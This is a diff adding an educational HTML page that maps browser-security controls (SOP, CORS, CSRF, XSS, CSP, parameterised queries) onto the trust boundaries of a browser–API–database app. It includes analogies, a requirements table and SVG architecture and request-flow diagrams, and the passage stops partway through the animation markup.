@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Browser Security in a 3-Tier App — SOP, CORS, CSRF, XSS, CSP — System Design</title>
+<style>
+  :root {
+    --bg: #f5f7fb;
+    --card: #ffffff;
+    --ink: #1b2230;
+    --muted: #5b6677;
+    --line: #e6eaf0;
+    --scenario: #f7567c;
+    --scenario-bg: #fff0f4;
+    --reqs: #f4a259;
+    --reqs-bg: #fff7ed;
+    --arch: #4361ee;
+    --arch-bg: #eef2ff;
+    --anim: #00b4d8;
+    --anim-bg: #eef9fc;
+    --dsa: #7048e8;
+    --dsa-bg: #f3effe;
+    --aws: #ff9900;
+    --aws-bg: #fff6e6;
+    --laymen: #ffb703;
+    --laymen-bg: #fff8e1;
+    --code-bg: #1e2430;
+    --code-ink: #e7ecf3;
+    --accent: #2dc653;
+    --danger: #d90429;
+    --shadow: 0 6px 24px rgba(27,34,48,.08);
+    --radius: 16px;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.65;
+  }
+  .wrap { max-width: 980px; margin: 0 auto; padding: 32px 20px 80px; }
+  header.hero {
+    background: linear-gradient(135deg, #d90429 0%, #7048e8 55%, #4361ee 100%);
+    color: #fff;
+    border-radius: var(--radius);
+    padding: 44px 38px;
+    box-shadow: var(--shadow);
+    margin-bottom: 24px;
+  }
+  header.hero .kicker {
+    text-transform: uppercase; letter-spacing: .14em; font-size: .75rem;
+    font-weight: 700; opacity: .85; margin-bottom: 10px;
+  }
+  header.hero h1 { margin: 0 0 10px; font-size: 2.2rem; letter-spacing: -.5px; }
+  header.hero p { margin: 0; font-size: 1.1rem; opacity: .94; }
+  nav.toc {
+    position: sticky; top: 12px; z-index: 5;
+    background: var(--card); border: 1px solid var(--line);
+    border-radius: 12px; padding: 10px 12px; margin-bottom: 26px;
+    box-shadow: var(--shadow);
+    display: flex; gap: 6px; flex-wrap: wrap;
+  }
+  nav.toc a {
+    text-decoration: none; color: var(--muted); font-size: .85rem;
+    padding: 6px 11px; border-radius: 999px; transition: .15s; white-space: nowrap;
+  }
+  nav.toc a:hover { background: var(--bg); color: var(--ink); }
+  section.card {
+    background: var(--card); border: 1px solid var(--line);
+    border-radius: var(--radius); padding: 28px 32px; margin-bottom: 22px;
+    box-shadow: var(--shadow);
+  }
+  section.scenario { border-left: 6px solid var(--scenario); background: var(--scenario-bg); }
+  section.laymen   { border-left: 6px solid var(--laymen);   background: var(--laymen-bg); }
+  section.reqs     { border-left: 6px solid var(--reqs);     background: var(--reqs-bg); }
+  section.arch     { border-left: 6px solid var(--arch);     background: var(--arch-bg); }
+  section.anim-sec { border-left: 6px solid var(--anim);     background: var(--anim-bg); }
+  section.dsa      { border-left: 6px solid var(--dsa);      background: var(--dsa-bg); }
+  section.aws      { border-left: 6px solid var(--aws);      background: var(--aws-bg); }
+  .badge {
+    display: inline-block; font-size: .76rem; font-weight: 700;
+    text-transform: uppercase; letter-spacing: .06em;
+    padding: 4px 12px; border-radius: 999px; margin-bottom: 14px; color: #fff;
+  }
+  .scenario .badge { background: var(--scenario); }
+  .laymen .badge   { background: var(--laymen); color: #3b2b00; }
+  .reqs .badge     { background: var(--reqs); }
+  .arch .badge     { background: var(--arch); }
+  .anim-sec .badge { background: var(--anim); }
+  .dsa .badge      { background: var(--dsa); }
+  .aws .badge      { background: var(--aws); }
+  h2 { margin: 0 0 14px; font-size: 1.5rem; letter-spacing: -.3px; }
+  h3 { margin: 22px 0 8px; font-size: 1.14rem; }
+  h4 { margin: 16px 0 6px; font-size: 1.02rem; }
+  p, li { color: var(--ink); }
+  table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: .93rem; }
+  th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  th { background: rgba(67,97,238,.08); font-weight: 700; }
+  code:not(pre code) {
+    background: #eef1f6; padding: 2px 6px; border-radius: 6px;
+    font-family: "SF Mono", Consolas, Menlo, monospace; font-size: .9em;
+  }
+  pre {
+    background: var(--code-bg); color: var(--code-ink);
+    padding: 18px 20px; border-radius: 12px; overflow-x: auto;
+    font-family: "SF Mono", Consolas, Menlo, monospace; font-size: .87rem; line-height: 1.55;
+  }
+  pre .cmt { color: #7f8aa0; font-style: italic; }
+  pre .kw  { color: #ff9e64; }
+  pre .str { color: #9ece6a; }
+  pre .fn  { color: #7aa2f7; }
+  pre .typ { color: #2ac3de; }
+  .diagram {
+    background: #0f1420; border-radius: 14px; padding: 22px; margin: 18px 0;
+    overflow-x: auto; box-shadow: inset 0 0 0 1px rgba(255,255,255,.05);
+  }
+  .diagram svg { display: block; margin: 0 auto; max-width: 100%; height: auto; }
+  .viz {
+    background: #0f1420; border-radius: 12px; padding: 18px;
+    font-family: "SF Mono", Consolas, monospace; color: #c6d0e0;
+    overflow-x: auto; margin: 14px 0; white-space: pre; font-size: .85rem; line-height: 1.5;
+  }
+  .legend { display: flex; gap: 18px; flex-wrap: wrap; margin-top: 12px; font-size: .85rem; color: var(--muted); }
+  .legend span { display: inline-flex; align-items: center; gap: 6px; }
+  .dot { width: 12px; height: 12px; border-radius: 3px; display: inline-block; }
+  .callout {
+    border-radius: 12px; padding: 14px 18px; margin: 14px 0; font-size: .95rem;
+    border-left: 4px solid var(--arch);
+    background: #eef2ff;
+  }
+  .callout.warn { border-left-color: var(--danger); background: #fff0f4; }
+  .callout.ok   { border-left-color: var(--accent); background: #e6f9ec; }
+  .qa { border-left: 3px solid var(--arch); padding: 4px 0 4px 16px; margin: 16px 0; }
+  .qa .q { font-weight: 700; }
+  .qa .a { color: var(--muted); }
+  section.faq { border-left: 6px solid #00b4d8; background: #eef9fc; }
+  section.faq .badge { background: #00b4d8; }
+  .faq-item {
+    background: var(--card); border: 1px solid var(--line);
+    border-radius: 12px; padding: 14px 18px; margin: 12px 0;
+  }
+  .faq-item .q { font-weight: 700; display: flex; gap: 8px; align-items: baseline; }
+  .faq-item .q::before { content: "Q"; color: #00b4d8; font-weight: 800; }
+  .faq-item .a { margin: 6px 0 0; }
+  .faq-item .a::before { content: "A "; color: var(--accent); font-weight: 800; }
+  .faq-item .meta { color: var(--muted); font-size: .78rem; margin-top: 8px; }
+  .cheat {
+    background: linear-gradient(135deg, #2dc653 0%, #208b3a 100%);
+    color: #fff; border-radius: var(--radius); padding: 26px 32px;
+    box-shadow: var(--shadow); margin-bottom: 22px;
+  }
+  .cheat h2 { color: #fff; }
+  .cheat ul { margin: 0; padding-left: 20px; }
+  .cheat .pitch {
+    background: rgba(255,255,255,.15); border-radius: 12px; padding: 14px 18px; margin: 0 0 16px;
+    font-size: 1.02rem;
+  }
+  .sources { font-size: .9rem; }
+  .sources a { color: var(--arch); }
+  footer { text-align: center; color: var(--muted); font-size: .85rem; margin-top: 30px; }
+
+  .anim-frame {
+    background: #0f1420; border-radius: 14px; padding: 22px 22px 0;
+    box-shadow: inset 0 0 0 1px rgba(255,255,255,.05); margin: 14px 0;
+  }
+  .anim-frame svg { display: block; margin: 0 auto; max-width: 100%; height: auto; }
+  .anim-frame svg .a-el,
+  .anim-frame svg [data-anim] {
+    transition: transform .85s cubic-bezier(.4,0,.2,1),
+                opacity .5s ease,
+                fill .3s ease,
+                stroke .3s ease,
+                filter .3s ease;
+    transform-box: fill-box;
+  }
+  .anim-frame svg .a-hidden { opacity: 0; }
+  .anim-frame svg .a-glow   { filter: drop-shadow(0 0 8px currentColor) brightness(1.2); }
+  .anim-frame svg .a-dim    { opacity: .35; }
+  .anim-controls {
+    display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+    padding: 14px 4px 22px; margin-top: 14px;
+    border-top: 1px solid rgba(255,255,255,.08);
+  }
+  .anim-controls button {
+    background: #4361ee; color: #fff; border: 0; border-radius: 8px;
+    padding: 8px 16px; font: 700 .88rem/1 inherit; cursor: pointer;
+    transition: filter .15s, transform .1s;
+  }
+  .anim-controls button:hover { filter: brightness(1.15); }
+  .anim-controls button:active { transform: scale(.96); }
+  .anim-controls button.secondary { background: #2a3652; }
+  .anim-step-label {
+    color: #7fa2ff; font-weight: 700; font-size: .82rem; letter-spacing: .04em;
+    text-transform: uppercase; min-width: 88px;
+  }
+  .anim-step-caption {
+    color: #c6d0e0; font-size: .95rem; flex: 1 1 260px; line-height: 1.4;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <div class="kicker">System Design · Interview Prep · Solution Architect</div>
+    <h1>Browser Security in a 3-Tier App — SOP, CORS, CSRF, XSS, CSP &amp; Beyond</h1>
+    <p>Where each browser-security control actually lives in a real <strong>Browser → UI → API → DB</strong> stack, who enforces it, what attack it prevents, and how to configure it in production so a Solution Architect can defend every trust boundary end-to-end.</p>
+  </header>
+
+  <nav class="toc">
+    <a href="#scenario">🎯 Problem</a>
+    <a href="#laymen">🧑‍🎓 Laymen</a>
+    <a href="#reqs">📋 Requirements</a>
+    <a href="#arch">🏗️ Architecture</a>
+    <a href="#animation">🎬 Animation</a>
+    <a href="#deep">🔍 Deep-dive</a>
+    <a href="#dsa">🧮 Concepts</a>
+    <a href="#aws">☁️ AWS</a>
+    <a href="#code">💻 C# code</a>
+    <a href="#tradeoffs">⚖️ Trade-offs</a>
+    <a href="#cheat">🗣️ Cheat sheet</a>
+    <a href="#faq">❓ FAQ</a>
+    <a href="#sources">📚 Sources</a>
+  </nav>
+
+  <!-- ============================ PROBLEM ============================ -->
+  <section id="scenario" class="card scenario">
+    <span class="badge">🎯 The problem</span>
+    <h2>Every three-tier app has the same trust boundaries — and the same misunderstandings</h2>
+    <p>Nearly every modern web application is built the same way. A single-page frontend served from one origin, a backend HTTP API on another origin, and a private database behind the API. The user's browser is the untrusted execution environment where malicious script from other sites, malicious extensions, and malicious pages compete for access to a legitimate session. Backend engineers can name CORS, XSS, CSRF, and CSP individually, but very few can draw the picture that shows <em>where</em> each control lives, <em>who</em> enforces it, and <em>what</em> it actually protects — and just as importantly, what it does <em>not</em>.</p>
+    <p>Real interview and real production consequences follow from getting this wrong. Teams routinely mis-diagnose CORS errors, misconfigure <code>Access-Control-Allow-Origin: *</code> alongside credentials, disable CSRF protection assuming JWTs and SameSite cookies replace it, store bearer tokens in <code>localStorage</code> and get owned via XSS, or rely on the frontend hiding a button as if it were an authorization control. Every one of these mistakes maps to a specific boundary in the picture below — and once you can draw the boundary you know which control belongs there.</p>
+    <p>This page is the one map. It walks the request from the user's browser through the UI, through the API, into the database, and back — labelling every trust boundary with the concept that lives there, the layer that enforces it, and the failure mode when it is skipped. After reading it you should be able to look at any real Angular/React + .NET/Node/Java + SQL/DynamoDB architecture and immediately answer: which control applies, at which layer, who enforces it, what happens if it is misconfigured. Real products that get this right: banking apps like Chase and Revolut, payment platforms like Stripe, SaaS consoles like AWS and Datadog. Real products that don't: an alarming number of internal enterprise portals in every industry.</p>
+  </section>
+
+  <!-- ============================ LAYMEN ============================ -->
+  <section id="laymen" class="card laymen">
+    <span class="badge">🧑‍🎓 In laymen terms</span>
+    <h2>Imagine the browser is a busy shopping mall</h2>
+    <p>Picture your browser as a <strong>shopping mall</strong> full of separate stores. Each store has its own address (its "origin"): the bank's store, your webmail's store, a news site's store, and unfortunately a shady store called <em>evil.com</em> that some visitor wandered in from. Every store is open at the same time. You are logged in to the bank store — the bank recognises your face and lets you move your money.</p>
+    <p>The mall has a very strict security guard called the <strong>Same-Origin Policy</strong>. Their one rule: nobody working inside one store may reach across the aisle and grab items off a different store's shelf. This is what stops the shady store from silently reading your bank balance while you're browsing next door.</p>
+    <p>Sometimes two stores <em>want</em> to cooperate — the bank's frontend and the bank's API are actually two "stores" (different addresses) run by the same company. So we let each store post a sign at its door saying "the bank's frontend is welcome to take items from my shelves". That polite door-sign is called <strong>CORS</strong>. It's not a lock — it's a note that the browser guard reads before deciding to let a script pass items back.</p>
+    <p>Some concepts are about <em>tricking your browser</em> into doing something you didn't intend. If evil.com quietly puts an invisible form on its page that submits money-transfer requests to the bank while you're logged in, that's called <strong>CSRF</strong> — a forged action, using your cookie the browser attaches automatically. The bank fights this by asking every action to include a secret token that only its own pages know.</p>
+    <p>Other concepts are about <em>attacker code running inside a store that trusts it</em>. If the bank forgets to escape user input and someone types <code>&lt;script&gt;steal-my-money&lt;/script&gt;</code> into their profile, every visitor who views that profile runs that script <strong>as the bank's own page</strong>. That is <strong>XSS</strong>, and it is worse than CORS violations because the malicious code isn't crossing the security guard — it's already inside. <strong>CSP</strong> is a printed list on the wall telling the mall guard "only scripts from these approved suppliers are allowed to run in my store", so even accidental XSS is much harder to weaponise.</p>
+    <p>Behind all of this is a private back office — the <strong>database</strong>. No stranger from the mall ever walks in. Only the bank's own staff, over a private hallway, using their staff card, using request forms that are impossible to trick. The bank never lets a customer's raw request "become" a database query — it always fills in a template. That's <strong>parameterised queries</strong>, the defence against <strong>SQL injection</strong>.</p>
+    <p>Real products every reader has used run exactly this pattern: Google, Amazon, Netflix, your bank's app. What separates the ones that don't get owned from the ones that do is that every trust boundary — <strong>browser to UI, UI to API, API to database</strong> — has an explicit control, and the team knows which one lives where.</p>
+  </section>
+
+  <!-- ============================ REQUIREMENTS ============================ -->
+  <section id="reqs" class="card reqs">
+    <span class="badge">📋 Requirements &amp; scope</span>
+    <h2>What we want the design to guarantee</h2>
+
+    <h3>Functional requirements</h3>
+    <ul>
+      <li>Users load the UI at <code>https://portal.example.com</code>, which calls the API at <code>https://api.example.com</code>.</li>
+      <li>Only the company's approved frontends may read authenticated API responses in a browser.</li>
+      <li>An attacker's page (e.g. <code>evil.com</code>) must not be able to read the user's data, and must not be able to perform authenticated actions on the user's behalf.</li>
+      <li>User input never becomes executable HTML/JS on another user's page.</li>
+      <li>User input never becomes an executable SQL fragment.</li>
+      <li>The API works from Postman and CI/CD test runners (they don't enforce SOP), but only <em>authorised</em> traffic gets past authentication.</li>
+    </ul>
+
+    <h3>Non-functional requirements</h3>
+    <ul>
+      <li><strong>Correctness first.</strong> Every control belongs on the right side of a trust boundary. A frontend "hide button" is UX, not a security control.</li>
+      <li><strong>Defense in depth.</strong> One misconfiguration should not break the whole system. CSP + output encoding + HttpOnly cookies together survive one bug.</li>
+      <li><strong>Observable.</strong> CSP reports, WAF logs, and auth failures flow to a central log with alerts on anomalies.</li>
+      <li><strong>Least privilege.</strong> DB user, IAM roles, and cookie scopes are all narrowed to the minimum that works.</li>
+      <li><strong>Compliant.</strong> The baseline passes OWASP ASVS Level 2 checks and the OWASP Top-10 categories.</li>
+    </ul>
+
+    <h3>Concept-to-boundary map (memorise this)</h3>
+    <table>
+      <tr><th>Trust boundary</th><th>Concept</th><th>Enforced by</th><th>Prevents</th></tr>
+      <tr><td>Cross-site → browser</td><td>Same-Origin Policy</td><td>Browser</td><td>Malicious page reading another origin's response</td></tr>
+      <tr><td>Browser ⇄ API (cross-origin)</td><td>CORS</td><td>Browser (server opts in)</td><td>Cross-origin JS reading responses without permission</td></tr>
+      <tr><td>Browser ⇄ API (auth)</td><td>Cookies + SameSite / Bearer tokens</td><td>Browser (SameSite) + Server (verify)</td><td>Session hijack, forged auth</td></tr>
+      <tr><td>Cross-site → authenticated API</td><td>CSRF tokens / SameSite / origin check</td><td>Server (validate token)</td><td>Forged actions on behalf of a logged-in user</td></tr>
+      <tr><td>Untrusted input → rendered HTML</td><td>Output encoding / sanitization</td><td>Server &amp; UI framework</td><td>XSS</td></tr>
+      <tr><td>Untrusted script in trusted origin</td><td>CSP</td><td>Browser (server sets header)</td><td>Weaponising XSS</td></tr>
+      <tr><td>Attacker embeds our UI</td><td><code>frame-ancestors</code> / X-Frame-Options</td><td>Browser (server sets header)</td><td>Clickjacking</td></tr>
+      <tr><td>UI → API (all requests)</td><td>Authentication + Authorization</td><td>Server</td><td>Unauthenticated / unauthorised access, IDOR/BOLA</td></tr>
+      <tr><td>UI → API (payload)</td><td>Server-side input validation</td><td>Server</td><td>Malformed input, business-rule bypass</td></tr>
+      <tr><td>API → DB</td><td>Parameterised queries, least priv DB user, TLS</td><td>Server / DB engine</td><td>SQL injection, data exfil</td></tr>
+    </table>
+  </section>
+
+  <!-- ============================ ARCHITECTURE ============================ -->
+  <section id="arch" class="card arch">
+    <span class="badge">🏗️ High-level architecture</span>
+    <h2>Three tiers, three trust boundaries, one map</h2>
+    <p>The whole point of this page is the picture below. The browser is one trust boundary, the API is another, and the database is a third. Different concepts apply to different boundaries — this is the mistake most engineers make when they lump "web security" into a single mental bucket. Read the diagram left-to-right, top-to-bottom, and note where each label sits: browser-side controls are on the left inside the browser box, server-side controls are on the right inside the API box, DB controls are inside the database box.</p>
+
+    <div class="diagram">
+      <svg viewBox="0 0 900 620" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="arrH" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+            <path d="M0,0 L10,5 L0,10 z" fill="#7aa2f7"/>
+          </marker>
+        </defs>
+
+        <!-- Browser box -->
+        <rect x="30" y="20" width="840" height="180" rx="16" fill="#151a2e" stroke="#4361ee" stroke-width="2"/>
+        <text x="50" y="46" fill="#7fa2ff" font-family="sans-serif" font-size="13" font-weight="700">BROWSER  (untrusted execution environment)</text>
+        <text x="50" y="66" fill="#a3b1c8" font-family="sans-serif" font-size="11">enforces client-side controls · runs untrusted script alongside your app</text>
+
+        <!-- browser sub boxes -->
+        <g font-family="sans-serif" font-size="11" fill="#e7ecf3">
+          <rect x="50"  y="86" width="180" height="90" rx="10" fill="#1e2a4a" stroke="#7aa2f7"/>
+          <text x="140" y="106" text-anchor="middle" font-weight="700">Same-Origin Policy</text>
+          <text x="140" y="122" text-anchor="middle" fill="#a3b1c8">JS can't read across origins</text>
+          <text x="140" y="140" text-anchor="middle" font-weight="700">CORS</text>
+          <text x="140" y="156" text-anchor="middle" fill="#a3b1c8">controlled opt-in by server</text>
+          <text x="140" y="174" text-anchor="middle" fill="#a3b1c8">Cookie SameSite / HSTS</text>
+
+          <rect x="245" y="86" width="180" height="90" rx="10" fill="#1e2a4a" stroke="#7aa2f7"/>
+          <text x="335" y="106" text-anchor="middle" font-weight="700">Content Security Policy</text>
+          <text x="335" y="122" text-anchor="middle" fill="#a3b1c8">restrict script/img/connect</text>
+          <text x="335" y="140" text-anchor="middle" font-weight="700">frame-ancestors</text>
+          <text x="335" y="156" text-anchor="middle" fill="#a3b1c8">clickjacking defense</text>
+          <text x="335" y="174" text-anchor="middle" fill="#a3b1c8">Permissions/Referrer policy</text>
+
+          <rect x="440" y="86" width="180" height="90" rx="10" fill="#1e2a4a" stroke="#7aa2f7"/>
+          <text x="530" y="106" text-anchor="middle" font-weight="700">Cookies</text>
+          <text x="530" y="122" text-anchor="middle" fill="#a3b1c8">HttpOnly · Secure · SameSite</text>
+          <text x="530" y="140" text-anchor="middle" font-weight="700">or Bearer Tokens</text>
+          <text x="530" y="156" text-anchor="middle" fill="#a3b1c8">Authorization header</text>
+          <text x="530" y="174" text-anchor="middle" fill="#a3b1c8">stored where JS can read</text>
+
+          <rect x="635" y="86" width="220" height="90" rx="10" fill="#1e2a4a" stroke="#7aa2f7"/>
+          <text x="745" y="106" text-anchor="middle" font-weight="700">Your SPA (Angular/React)</text>
+          <text x="745" y="122" text-anchor="middle" fill="#a3b1c8">framework auto-escape</text>
+          <text x="745" y="140" text-anchor="middle" fill="#a3b1c8">avoid innerHTML/eval</text>
+          <text x="745" y="156" text-anchor="middle" fill="#a3b1c8">client-side validation = UX</text>
+          <text x="745" y="174" text-anchor="middle" fill="#a3b1c8">the real gate is upstream</text>
+        </g>
+
+        <!-- HTTPS arrow -->
+        <path d="M 450,200 L 450,240" stroke="#7aa2f7" stroke-width="3" marker-end="url(#arrH)"/>
+        <text x="470" y="225" fill="#7fa2ff" font-family="monospace" font-size="12" font-weight="700">HTTPS · TLS 1.2+ · HSTS</text>
+
+        <!-- API box -->
+        <rect x="30" y="250" width="840" height="200" rx="16" fill="#0f2418" stroke="#2dc653" stroke-width="2"/>
+        <text x="50" y="276" fill="#9be7a3" font-family="sans-serif" font-size="13" font-weight="700">API TIER  (trusted server code — the actual security perimeter)</text>
+        <text x="50" y="294" fill="#a3b1c8" font-family="sans-serif" font-size="11">every browser-side control assumes this tier enforces its own controls independently</text>
+
+        <g font-family="sans-serif" font-size="11" fill="#e7ecf3">
+          <rect x="50"  y="312" width="180" height="120" rx="10" fill="#183a24" stroke="#2dc653"/>
+          <text x="140" y="332" text-anchor="middle" font-weight="700">Edge / API Gateway</text>
+          <text x="140" y="350" text-anchor="middle" fill="#a3b1c8">TLS termination</text>
+          <text x="140" y="368" text-anchor="middle" fill="#a3b1c8">WAF · rate limiting</text>
+          <text x="140" y="386" text-anchor="middle" fill="#a3b1c8">CORS policy</text>
+          <text x="140" y="404" text-anchor="middle" fill="#a3b1c8">OPTIONS preflight reply</text>
+          <text x="140" y="422" text-anchor="middle" fill="#a3b1c8">security headers</text>
+
+          <rect x="245" y="312" width="180" height="120" rx="10" fill="#183a24" stroke="#2dc653"/>
+          <text x="335" y="332" text-anchor="middle" font-weight="700">AuthN &amp; AuthZ</text>
+          <text x="335" y="350" text-anchor="middle" fill="#a3b1c8">verify cookie/JWT</text>
+          <text x="335" y="368" text-anchor="middle" fill="#a3b1c8">check RBAC/ABAC</text>
+          <text x="335" y="386" text-anchor="middle" fill="#a3b1c8">object-level authZ (IDOR)</text>
+          <text x="335" y="404" text-anchor="middle" fill="#a3b1c8">CSRF token validate</text>
+          <text x="335" y="422" text-anchor="middle" fill="#a3b1c8">origin check</text>
+
+          <rect x="440" y="312" width="180" height="120" rx="10" fill="#183a24" stroke="#2dc653"/>
+          <text x="530" y="332" text-anchor="middle" font-weight="700">Input Validation</text>
+          <text x="530" y="350" text-anchor="middle" fill="#a3b1c8">shape · type · range</text>
+          <text x="530" y="368" text-anchor="middle" fill="#a3b1c8">canonicalize</text>
+          <text x="530" y="386" text-anchor="middle" fill="#a3b1c8">business rules</text>
+          <text x="530" y="404" text-anchor="middle" font-weight="700">Output Encoding</text>
+          <text x="530" y="422" text-anchor="middle" fill="#a3b1c8">context-aware sanitize</text>
+
+          <rect x="635" y="312" width="220" height="120" rx="10" fill="#183a24" stroke="#2dc653"/>
+          <text x="745" y="332" text-anchor="middle" font-weight="700">Business Logic</text>
+          <text x="745" y="350" text-anchor="middle" fill="#a3b1c8">idempotency · audit</text>
+          <text x="745" y="368" text-anchor="middle" font-weight="700">Response Headers</text>
+          <text x="745" y="386" text-anchor="middle" fill="#a3b1c8">CORS · CSP · HSTS</text>
+          <text x="745" y="404" text-anchor="middle" fill="#a3b1c8">X-Content-Type-Options</text>
+          <text x="745" y="422" text-anchor="middle" fill="#a3b1c8">Referrer-Policy</text>
+        </g>
+
+        <!-- Private link arrow -->
+        <path d="M 450,450 L 450,490" stroke="#ff9900" stroke-width="3" marker-end="url(#arrH)"/>
+        <text x="470" y="475" fill="#ffb703" font-family="monospace" font-size="12" font-weight="700">Private network · TLS · IAM · least-priv DB user</text>
+
+        <!-- DB box -->
+        <rect x="30" y="500" width="840" height="100" rx="16" fill="#2a1810" stroke="#ff9900" stroke-width="2"/>
+        <text x="50" y="526" fill="#ffb703" font-family="sans-serif" font-size="13" font-weight="700">DATABASE  (never reachable from the browser)</text>
+        <g font-family="sans-serif" font-size="11" fill="#e7ecf3">
+          <rect x="50"  y="540" width="180" height="50" rx="10" fill="#3a2a12" stroke="#ff9900"/>
+          <text x="140" y="561" text-anchor="middle" font-weight="700">Parameterised queries</text>
+          <text x="140" y="578" text-anchor="middle" fill="#a3b1c8">no SQL from strings</text>
+
+          <rect x="245" y="540" width="180" height="50" rx="10" fill="#3a2a12" stroke="#ff9900"/>
+          <text x="335" y="561" text-anchor="middle" font-weight="700">Least-priv DB user</text>
+          <text x="335" y="578" text-anchor="middle" fill="#a3b1c8">no DDL · no admin</text>
+
+          <rect x="440" y="540" width="180" height="50" rx="10" fill="#3a2a12" stroke="#ff9900"/>
+          <text x="530" y="561" text-anchor="middle" font-weight="700">Encryption at rest</text>
+          <text x="530" y="578" text-anchor="middle" fill="#a3b1c8">KMS · TDE</text>
+
+          <rect x="635" y="540" width="220" height="50" rx="10" fill="#3a2a12" stroke="#ff9900"/>
+          <text x="745" y="561" text-anchor="middle" font-weight="700">Auditing &amp; row-level security</text>
+          <text x="745" y="578" text-anchor="middle" fill="#a3b1c8">CloudTrail · pgaudit</text>
+        </g>
+      </svg>
+      <div class="legend">
+        <span><span class="dot" style="background:#7aa2f7"></span>Browser trust boundary</span>
+        <span><span class="dot" style="background:#2dc653"></span>API trust boundary (real perimeter)</span>
+        <span><span class="dot" style="background:#ff9900"></span>DB trust boundary</span>
+      </div>
+    </div>
+
+    <p>Two rules of thumb this picture makes obvious. First, <strong>browser-side controls (SOP, CORS, CSP, SameSite) apply only between browser and UI/API — never between API and database</strong>. Postman, curl, mobile apps, and server-to-server calls never enforce them, which is exactly why the API tier must never <em>rely</em> on them for security. Second, <strong>server-side controls (authN, authZ, CSRF validation, input validation, parameterised queries) apply on every request — regardless of whether the client is a browser, a mobile app, curl, or a server</strong>. Every arrow into the API box is checked; every arrow into the DB box is prepared, not concatenated.</p>
+  </section>
+
+  <!-- ============================ ANIMATION ============================ -->
+  <section id="animation" class="card anim-sec">
+    <span class="badge">🎬 Animation</span>
+    <h2>Watch a request cross every trust boundary, step by step</h2>
+    <p>The animation walks through one authenticated call — <code>portal.example.com</code>'s SPA POSTs an order to <code>api.example.com</code>. Because the origins differ and the request has an <code>Authorization</code> header, the browser triggers a CORS preflight first. Watch the OPTIONS handshake, the preflight verdict, the actual request travelling through the API's auth/authZ/validation gates, the parameterised SQL query, and the response coming back through CORS + CSP on its way to the JS.</p>
+
+    <div class="anim-frame" id="anim1">
+      <svg viewBox="0 0 900 460" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="mA" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+            <path d="M0,0 L10,5 L0,10 z" fill="#7aa2f7"/>
+          </marker>
+        </defs>
+
+        <!-- three lanes -->
+        <g font-family="sans-serif" font-size="11" fill="#e7ecf3">
+          <rect x="30"  y="30" width="180" height="60" rx="10" fill="#2a3652" stroke="#7aa2f7"/>
+          <text x="120" y="55" text-anchor="middle" font-weight="700">Browser (SPA)</text>
+          <text x="120" y="72" text-anchor="middle" fill="#a3b1c8" font-size="10">portal.example.com</text>
+
+          <rect x="360" y="30" width="180" height="60" rx="10" fill="#183a24" stroke="#2dc653"/>
+          <text x="450" y="55" text-anchor="middle" font-weight="700">API</text>
+          <text x="450" y="72" text-anchor="middle" fill="#a3b1c8" font-size="10">api.example.com</text>
+
+          <rect x="690" y="30" width="180" height="60" rx="10" fill="#3a2a12" stroke="#ff9900"/>
+          <text x="780" y="55" text-anchor="middle" font-weight="700">Database</text>
+          <text x="780" y="72" text-anchor="middle" fill="#a3b1c8" font-size="10">private VPC</text>
+        </g>
+
+        <!-- lifelines -->
+        <line x1="120" y1="90" x2="120" y2="440" stroke="#4a5b7a" stroke-dasharray="4 3"/>
+        <line x1="450" y1="90" x2="450" y2="440" stroke="#4a5b7a" stroke-dasharray="4 3"/>
+        <line x1="780" y1="90" x2="780" y2="440" stroke="#4a5b7a" stroke-dasharray="4 3"/>
+
+        <!-- arrows and labels (initially hidden) -->
+        <g id="m1" class="a-el a-hidden">
+          <path d="M 130,120 L 440,120" stroke="#7aa2f7" stroke-width="2" fill="none" marker-end="url(#mA)"/>
+          <text x="285" y="112" text-anchor="middle" fill="#c6d0e0" font-family="monospace" font-size="10">OPTIONS /orders  (preflight)</text>
+          <text x="285" y="130" text-anchor="middle" fill="#a3b1c8" font-family="monospace" font-size="9">Origin, Access-Control-Request-Method, -Headers</text>
+        </g>
+        <g id="m2" class="a-el a-hidden">
+          <path d="M 440,160 L 130,160" stroke="#2dc653" stroke-width="2" fill="none" marker-end="url(#mA)"/>
+          <text x="285" y="152" text-anchor="middle" fill="#9be7a3" font-family="monospace" font-size="10">204 · Access-Control-Allow-Origin: portal.example.com</text>
+          <text x="285" y="170" text-anchor="middle" fill="#a3b1c8" font-family="monospace" font-size="9">Allow-Methods · Allow-Headers · Allow-Credentials · Max-Age</text>
+        </g>
+        <g id="m3" class="a-el a-hidden">
+          <path d="M 130,200 L 440,200" stroke="#7aa2f7" stroke-width="2" fill="none" marker-end="url(#mA)"/>
+          <text x="285" y="192" text-anchor="middle" fill="#c6d0e0" font-family="monospace" font-size="10">POST /orders  (actual)</text>
+          <text x="285" y="210" text-anchor="middle" fill="#a3b1c8" font-family="monospace" font-size="9">Cookie: session · Authorization: Bearer · X-CSRF-Token · body JSON</text>
+        </g>
+        <g id="m4" class="a-el a-hidden">
+          <rect x="360" y="230" width="180" height="60" rx="8" fill="#0f2418" stroke="#2dc653"/>
+          <text x="450" y="250" text-anchor="middle" fill="#9be7a3" font-family="sans-serif" font-size="11" font-weight="700">Server-side gates</text>
+          <text x="450" y="268" text-anchor="middle" fill="#c6d0e0" font-family="monospace" font-size="10">AuthN → AuthZ → CSRF → validate</text>
+          <text x="450" y="284" text-anchor="middle" fill="#c6d0e0" font-family="monospace" font-size="10">400/401/403 if any fail</text>
+        </g>
+        <g id="m5" class="a-el a-hidden">
+          <path d="M 460,320 L 770,320" stroke="#ff9900" stroke-width="2" fill="none" marker-end="url(#mA)"/>
